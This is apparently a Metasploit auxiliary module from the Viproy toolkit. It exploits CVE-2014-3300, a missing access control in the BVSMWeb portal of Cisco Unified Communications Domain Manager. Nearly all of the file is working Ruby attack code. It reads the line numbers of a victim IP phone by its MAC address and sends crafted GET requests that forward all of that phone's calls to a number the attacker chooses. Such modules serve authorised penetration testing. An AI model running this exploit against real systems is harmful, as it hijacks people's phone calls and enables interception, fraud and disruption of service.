##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'rexml/document'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
        'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',
        'Description' => %q{
          The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager (CDM)
          in Unified CDM Application Software before 10 does not properly implement access control,
          which allows remote attackers to modify user information. This vulnerability can be exploited
          for unauthorised call forwarding using this module. This tool can be tested with the fake
          voss-xmlservice component of Viproy.
        },
        'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
        'References'  =>
            [
                ['CVE', '2014-3300'],
                ['BID', '68331'],
                ['Viproy Fake CUCDM Service', 'https://github.com/fozavci/viproy-voipkit/raw/master/external/voss-xmlservice.rb']
            ],
        'License'     => MSF_LICENSE,
        'Actions'     =>
            [
                [ 'Forward', {
                    'Description' => 'Enabling the call forwarding for the MAC address.'
                } ],
                [ 'Info', {
                    'Description' => 'Retrieving the call forwarding information for the MAC address.'
                } ]
            ],
        'DefaultAction'  => 'Info'

    )

    register_options(
        [
            OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
            OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
            OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
            OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines', '']),
        ], self.class)
  end

  def run
    uri = normalize_uri(target_uri.to_s)
    mac = Rex::Text.uri_encode(datastore["MAC"])
    forward_to = Rex::Text.uri_encode(datastore["FORWARDTO"])


    print_status("Getting fintnumbers and display names of the IP phone")

    uri_show=normalize_uri(uri+"/showcallfwd.cgi?device=SEP#{mac}")
    vprint_status("URL: "+uri_show)

    res = send_request_cgi(
      {
        'uri'    => uri_show,
        'method' => 'GET',
      })

    if res and res.code == 200 and res.body =~ /fintnumber/
      doc = REXML::Document.new(res.body)
      lines=[]
      fintnumbers=[]

      list=doc.root.get_elements("MenuItem")
      list.each {|lst|
        xlist=lst.get_elements("Name")
        xlist.each {|l| lines << "#{l[0]}"}
        xlist=lst.get_elements("URL")
        xlist.each {|l| fintnumbers << "#{l[0].to_s.split("fintnumber=")[1]}" }
      }
      lines.size.times{|i| print_status("Display Name: "+lines[i]+"\t"+"Fintnumber: "+fintnumbers[i])}

      # for a specific FINTNUMBER redirection
      fintnumbers = [datastore["FINTNUMBER"]] if [datastore["FINTNUMBER"]]

      if action.name.upcase == "FORWARD"
        fintnumbers.each {|fintnumber|

        print_status("Sending call forward request for #{fintnumber}")

        uri_fwd=normalize_uri(uri+"/phonecallfwd.cgi?cfoption=CallForwardAll&device=SEP#{mac}&ProviderName=NULL&fintnumber=#{fintnumber}&telno1=#{forward_to}")
        vprint_status("URL: "+uri_fwd)
        res = send_request_cgi(
            {
                'uri'    => uri_fwd,
                'method' => 'GET',
            })

        uri_fwdpln=normalize_uri(uri+"/showcallfwdperline.cgi?device=SEP#{mac}&fintnumber=#{fintnumber}")
        vprint_status("URL: "+uri_fwdpln)
        res = send_request_cgi(
            {
                'uri'    => uri_fwdpln,
                'method' => 'GET',
            })

        if res and res.body and res.body.to_s =~ /CFA/
          print_good("Call forwarded successfully for #{fintnumber}")
        else
          print_status("Call forward failed.")
        end
        }
      end
    else
      print_error("Target appears not vulnerable!")
    end
  end
end
